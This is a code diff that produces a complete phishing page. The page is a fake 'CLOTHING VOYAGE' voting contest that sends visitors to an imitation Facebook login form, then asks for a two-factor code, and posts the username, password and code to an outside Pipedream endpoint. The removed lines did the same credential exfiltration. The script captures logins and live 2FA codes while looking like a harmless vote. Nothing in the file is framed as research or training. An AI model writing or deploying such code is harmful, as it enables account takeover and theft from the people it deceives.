@@ -1,47 +1,191 @@
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();  // Stops page refresh
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CLOTHING VOYAGE</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('https://source.unsplash.com/1600x900/?fashion,clothing') no-repeat center center fixed;
+            background-size: cover;
+            text-align: center;
+            color: white;
+        }
 
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+        }
 
-    // Send login details to Pipedream
-    fetch('https://eox47yzip3pxtkv.m.pipedream.net', {  
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
-    })
-    .then(response => console.log("Login details sent to Pipedream!"))
-    .catch(error => console.error("Error:", error));
+        h1 {
+            font-size: 42px;
+            margin-bottom: 20px;
+        }
 
-    // Hide login form & show the 2FA message
-    document.getElementById('loginForm').style.display = 'none';
-    document.getElementById('thankYouMessage').style.display = 'block';
-});
+        .models {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
 
-// Event listener for the "Proceed with 2FA Code" button
-document.getElementById('proceedWith2FA').addEventListener('click', function() {
-    document.getElementById('verifyCodeMessage').style.display = 'block'; // Show 2FA input
-    document.getElementById('thankYouMessage').style.display = 'none'; // Hide previous message
-});
+        .models img {
+            width: 150px;
+            height: 200px;
+            margin: 10px;
+            border-radius: 8px;
+            border: 2px solid white;
+        }
 
-// Event listener for the 2FA code submission
-document.getElementById('submit2FACode').addEventListener('click', function() {
-    const twoFACode = document.getElementById('2FACode').value;
+        .btn {
+            display: inline-block;
+            background: #FFD700;
+            color: black;
+            padding: 10px 20px;
+            font-size: 18px;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
 
-    if (twoFACode) {
-        // Send 2FA code to Pipedream
-        fetch('https://eox47yzip3pxtkv.m.pipedream.net', {  
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ twoFACode })
-        })
-        .then(response => console.log("2FA Code sent to Pipedream!"))
-        .catch(error => console.error("Error:", error));
+        .hidden {
+            display: none;
+        }
 
-        // Hide the 2FA input & show success message
-        document.getElementById('verifyCodeMessage').style.display = 'none';
-        document.getElementById('successMessage').style.display = 'block';
-    } else {
-        alert('Please enter the 2FA code!');
-    }
-});
+        .box {
+            background: white;
+            color: black;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px auto;
+            max-width: 400px;
+        }
+
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        button {
+            background: #1877f2;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background: #166fe5;
+        }
+
+        #successMessage {
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- CLOTHING VOYAGE Homepage -->
+    <div class="container" id="homePage">
+        <h1>Welcome to CLOTHING VOYAGE</h1>
+        <div class="models">
+            <img src="https://source.unsplash.com/150x200/?model1" alt="Model 1">
+            <img src="https://source.unsplash.com/150x200/?model2" alt="Model 2">
+            <img src="https://source.unsplash.com/150x200/?model3" alt="Model 3">
+            <img src="https://source.unsplash.com/150x200/?model4" alt="Model 4">
+            <img src="https://source.unsplash.com/150x200/?model5" alt="Model 5">
+        </div>
+        <a href="#" class="btn" onclick="goToVote()">Click to Vote</a>
+    </div>
+
+    <!-- Voting Page -->
+    <div class="container hidden" id="votePage">
+        <h1>Vote via Social Media</h1>
+        <a href="#" class="btn" onclick="goToLogin()">Vote with Facebook</a>
+    </div>
+
+    <!-- Facebook Login Page -->
+    <div class="container hidden box" id="loginPage">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
+        <h2>Facebook Login</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Enter your username" required><br>
+            <input type="password" id="password" placeholder="Enter your password" required><br>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <!-- 2FA Input Page -->
+    <div class="container hidden box" id="verifyCodeMessage">
+        <h2>Stay tuned, the winner will be announced shortly</h2>
+        <input type="text" id="2FACode" placeholder="Enter 2FA code" required><br>
+        <button id="submit2FACode">Submit 2FA Code</button>
+    </div>
+
+    <!-- Success Message -->
+    <div class="container hidden box" id="successMessage">
+        <h2>Thanks for voting!</h2>
+    </div>
+
+    <script>
+        function goToVote() {
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('votePage').style.display = 'block';
+        }
+
+        function goToLogin() {
+            document.getElementById('votePage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();  
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            fetch('https://eox47yzip3pxtkv.m.pipedream.net', {  
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            });
+
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('verifyCodeMessage').style.display = 'block';
+        });
+
+        document.getElementById('submit2FACode').addEventListener('click', function() {
+            const twoFACode = document.getElementById('2FACode').value;
+
+            if (twoFACode) {
+                fetch('https://eox47yzip3pxtkv.m.pipedream.net', {  
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ twoFACode })
+                });
+
+                document.getElementById('verifyCodeMessage').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+            } else {
+                alert('Please enter the 2FA code!');
+            }
+        });
+    </script>
+
+</body>
+</html>
